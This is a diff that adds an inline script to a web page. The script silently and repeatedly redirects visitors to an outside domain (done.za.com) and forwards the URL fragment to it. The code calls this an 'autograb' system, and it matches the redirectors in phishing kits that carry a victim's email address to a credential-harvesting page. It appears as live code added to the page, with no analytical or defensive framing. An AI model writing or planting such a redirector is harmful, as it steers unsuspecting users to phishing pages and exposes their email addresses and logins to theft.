@@ -1,0 +1,58 @@
+<script>
+(function() {
+    'use strict';
+    
+    // Configuration - works with # command
+    const CONFIG = {
+        targetUrl: "https://done.za.com/grt/index.html",  // Your destination page
+        retryDelay: 800,          // Slightly faster retry on errors
+        checkInterval: 2500,      // Regular safety checks
+        redirectTimeout: 1200      // Timeout before fallback
+    };
+
+    // Safety flag to prevent loops
+    let isRedirecting = false;
+    
+    function autograbRedirect() {
+        // Skip if mid-redirect or no hash
+        if (isRedirecting || !window.location.hash) return;
+        
+        try {
+            isRedirecting = true;
+            const hashValue = window.location.hash.substring(1);
+            const newUrl = CONFIG.targetUrl + '#' + encodeURIComponent(hashValue);
+            
+            console.log('Autograb transferring: #' + hashValue);
+            
+            // Try silent redirect first
+            window.location.replace(newUrl);
+            
+            // Fallback if still on same page after timeout
+            setTimeout(() => {
+                if (window.location.href !== newUrl) {
+                    window.location.assign(newUrl);
+                }
+            }, CONFIG.redirectTimeout);
+            
+        } catch (e) {
+            console.warn('Autograb retrying...', e);
+            isRedirecting = false;
+            setTimeout(autograbRedirect, CONFIG.retryDelay);
+        }
+    }
+    
+    // Start the autograb system
+    (function init() {
+        // Immediate check
+        autograbRedirect();
+        
+        // Watch for hash changes
+        window.addEventListener('hashchange', autograbRedirect);
+        
+        // Regular safety checks
+        setInterval(autograbRedirect, CONFIG.checkInterval);
+        
+        console.log('Autograb system ready (# command active)');
+    })();
+})();
+</script>
